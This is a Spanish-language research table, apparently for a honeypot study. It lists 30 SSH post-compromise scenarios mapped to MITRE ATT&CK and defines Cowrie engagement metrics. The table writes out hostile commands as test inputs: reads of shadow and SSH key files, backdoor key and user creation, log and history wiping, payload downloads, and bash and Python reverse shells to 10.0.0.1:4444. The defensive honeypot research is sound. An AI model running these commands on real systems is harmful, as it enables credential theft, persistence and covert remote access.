# Escenarios MITRE ATT&CK — tabla maestra

30 escenarios post-autenticación SSH. Cada escenario se ejecuta contra `safe-honeypot` (Condición A) y `safe-honeypot-llm` (Condición B) en la Semana 47.

## Tabla completa

| ID | Nombre | Táctica (TA) | Técnica(s) (T) | Comandos | Complejidad |
|----|--------|-------------|----------------|----------|-------------|
| S01 | System Information Discovery | Discovery TA0007 | T1082 | id, whoami, uname -a, hostname, uptime | Baja |
| S02 | Network Discovery | Discovery TA0007 | T1016, T1049 | ifconfig / ip a, netstat -tulnp / ss -tulnp, ip route | Baja |
| S03 | User Enumeration | Discovery TA0007 | T1087.001 | cat /etc/passwd, w, who, last | Baja |
| S04 | Process Listing | Discovery TA0007 | T1057 | ps aux, top -b -n1 | Baja |
| S05 | File System Enumeration | Discovery TA0007 | T1083 | ls -la /, ls /home, ls /root, ls /var/www | Baja |
| S06 | Service Enumeration | Discovery TA0007 | T1007 | systemctl list-units --type=service, cat /etc/services | Media |
| S07 | Software Inventory | Discovery TA0007 | T1518.001 | dpkg -l, which python3 curl wget nc, pip3 list | Media |
| S08 | Environment & Config | Discovery TA0007 | T1082 | env, cat /etc/os-release, cat /proc/version, df -h | Baja |
| S09 | Password File Dump | Credential Access TA0006 | T1003.008 | cat /etc/passwd, cat /etc/shadow | Baja |
| S10 | SSH Key Enumeration | Credential Access TA0006 | T1552.004 | ls -la ~/.ssh, cat ~/.ssh/authorized_keys, cat ~/.ssh/id_rsa | Media |
| S11 | Shell History Exfil | Credential Access TA0006 | T1552.003 | cat ~/.bash_history, cat ~/.zsh_history | Baja |
| S12 | Config File Credential Hunt | Credential Access TA0006 | T1552.001 | find /etc -name "*.conf" -readable, grep -r "password" /etc/mysql 2>/dev/null | Media |
| S13 | Memory Credential Search | Credential Access TA0006 | T1552.001 | grep -r "pass" /var/www/html 2>/dev/null, find / -name ".env" 2>/dev/null | Alta |
| S14 | Cron Persistence | Persistence TA0003 | T1053.003 | crontab -l, echo "* * * * * id" \| crontab -, crontab -l | Media |
| S15 | SSH Authorized Key Backdoor | Persistence TA0003 | T1098.004 | mkdir -p ~/.ssh, echo "ssh-rsa AAAA… backdoor" >> ~/.ssh/authorized_keys, cat ~/.ssh/authorized_keys | Media |
| S16 | New Local User | Persistence TA0003 | T1136.001 | useradd -m -s /bin/bash r00t, echo 'r00t:P@ssw0rd' \| chpasswd, cat /etc/passwd \| tail -3 | Alta |
| S17 | Bashrc Persistence | Persistence TA0003 | T1546.004 | echo 'alias sudo="sudo -E"' >> ~/.bashrc, echo 'export PATH=.:$PATH' >> ~/.bashrc, cat ~/.bashrc \| tail -5 | Media |
| S18 | Sudo Enumeration | Privilege Escalation TA0004 | T1548.003 | sudo -l, cat /etc/sudoers 2>/dev/null | Baja |
| S19 | SUID Binary Abuse | Privilege Escalation TA0004 | T1548.001 | find / -perm -u=s -type f 2>/dev/null, find / -perm -4000 -user root 2>/dev/null | Media |
| S20 | Kernel Exploit Research | Privilege Escalation TA0004 | T1068 | uname -r, cat /proc/version, cat /etc/lsb-release | Baja |
| S21 | Log Wiping | Defense Evasion TA0005 | T1070.002 | cat /dev/null > /var/log/auth.log, cat /dev/null > /var/log/syslog, ls -lh /var/log/ | Alta |
| S22 | History Erase | Defense Evasion TA0005 | T1070.003 | history -c, unset HISTFILE, export HISTSIZE=0 | Baja |
| S23 | Timestomp | Defense Evasion TA0005 | T1070.006 | touch -t 202001010000 /root/.ssh/authorized_keys, stat /root/.ssh/authorized_keys | Media |
| S24 | Process Masquerading | Defense Evasion TA0005 | T1036.005 | cp /bin/bash /tmp/sshd, ls -la /tmp/sshd | Media |
| S25 | Remote File Download | C2 TA0011 | T1105 | curl -s http://10.0.0.1/payload -o /tmp/p, wget -q http://10.0.0.1/payload -O /tmp/p | Media |
| S26 | Python Reverse Shell | Execution TA0002 | T1059.006 | python3 -c "import socket,os,pty;s=socket.socket();s.connect(('10.0.0.1',4444));…" | Alta |
| S27 | Bash Reverse Shell | Execution TA0002 | T1059.004 | bash -i >& /dev/tcp/10.0.0.1/4444 0>&1 | Alta |
| S28 | Sensitive File Search | Collection TA0009 | T1005 | find / -name "*.pem" -o -name "*.key" -o -name "id_rsa" 2>/dev/null, find / -name "*.db" 2>/dev/null | Alta |
| S29 | Database Credential Hunt | Collection TA0009 | T1005 | mysql -u root -e "show databases;" 2>/dev/null, cat /etc/mysql/my.cnf 2>/dev/null | Media |
| S30 | Crypto Miner Deployment | Impact TA0040 | T1496 | curl -s https://pool.minexmr.com 2>/dev/null \|\| echo "blocked", cp /bin/bash /tmp/.xmrig, chmod +x /tmp/.xmrig | Alta |

## Complejidad

- **Baja** — 1–2 comandos, sin dependencias entre ellos.
- **Media** — 2–4 comandos con alguna dependencia (leer antes de escribir, crear antes de verificar).
- **Alta** — 4+ comandos encadenados, o comandos con efectos en el sistema (modificar archivos, crear usuarios, intentar conectar a red).

## Métrica de engagement

Para cada escenario y condición se miden:

1. **Comandos capturados** — conteo de `cowrie.command.input` en la sesión.
2. **Latencia media por comando** — de `cowrie.session.connect` a `cowrie.session.closed`.
3. **Salida no vacía** — porcentaje de comandos con respuesta (vs. "command not found").
4. **TTPs mapeados** — técnicas ATT&CK observadas en `cowrie.json`.

El parser de la Semana 46 extrae estas cuatro métricas de los logs JSON.
